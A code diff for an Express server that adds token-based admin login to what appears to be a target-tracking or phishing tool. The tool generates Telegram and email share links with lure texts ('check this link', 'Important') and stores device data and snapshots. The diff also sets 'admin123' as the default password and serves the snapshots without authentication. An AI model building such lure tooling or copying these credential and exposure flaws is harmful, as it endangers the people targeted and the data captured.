@@ -17,18 +17,43 @@ const io = new Server(server, {
 
 const PORT = process.env.PORT || 8080;  // Railway assigns dynamic PORT
 const DATA_DIR = path.join(__dirname, 'data');
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
+const crypto = require('crypto');
+
+// Admin token store
+const adminTokens = new Set();
 
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 if (!fs.existsSync(path.join(DATA_DIR, 'snapshots'))) fs.mkdirSync(path.join(DATA_DIR, 'snapshots'));
 
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', process.env.CORS_ORIGIN || '*');
-    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
     res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE');
     if (req.method === 'OPTIONS') return res.sendStatus(200);
     next();
 });
 app.use(express.json({ limit: '50mb' }));
+
+// Admin auth middleware
+function verifyAdmin(req, res, next) {
+    // Public endpoints (no auth needed)
+    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html'];
+    if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path === '/index.html') return next();
+    // Protect admin.html — use token param for page load, header for API
+    if (req.path === '/admin.html') {
+        const token = req.query.token || req.headers['x-admin-token'];
+        if (token && adminTokens.has(token)) return next();
+        return res.redirect('/login-admin.html');
+    }
+    if (req.path.startsWith('/api/')) {
+        const token = req.headers['x-admin-token'] || (req.headers['authorization'] && req.headers['authorization'].replace('Bearer ', ''));
+        if (token && adminTokens.has(token)) return next();
+        return res.status(401).json({ error: 'unauthorized' });
+    }
+    next();
+}
+app.use(verifyAdmin);
 app.use(express.static(path.join(__dirname, 'public')));
 
 const devices = new Map();
@@ -564,6 +589,24 @@ app.get('/api/target/link', (req, res) => {
         telegram: 'https://t.me/share/url?url=' + encodeURIComponent(baseUrl + '/') + '&text=' + encodeURIComponent('Cek link ini'),
         email: `mailto:?subject=Penting&body=` + encodeURIComponent(baseUrl + '/')
     });
+});
+
+// Admin login/logout
+app.post('/api/admin/login', (req, res) => {
+    const { password } = req.body || {};
+    if (password === ADMIN_PASSWORD) {
+        const token = crypto.randomBytes(24).toString('hex');
+        adminTokens.add(token);
+        res.json({ ok: true, token });
+    } else {
+        res.status(401).json({ error: 'wrong password' });
+    }
+});
+
+app.post('/api/admin/logout', (req, res) => {
+    const token = req.headers['x-admin-token'] || (req.headers['authorization'] && req.headers['authorization'].replace('Bearer ', ''));
+    if (token) adminTokens.delete(token);
+    res.json({ ok: true });
 });
 
 app.use('/snapshots', express.static(path.join(DATA_DIR, 'snapshots')));
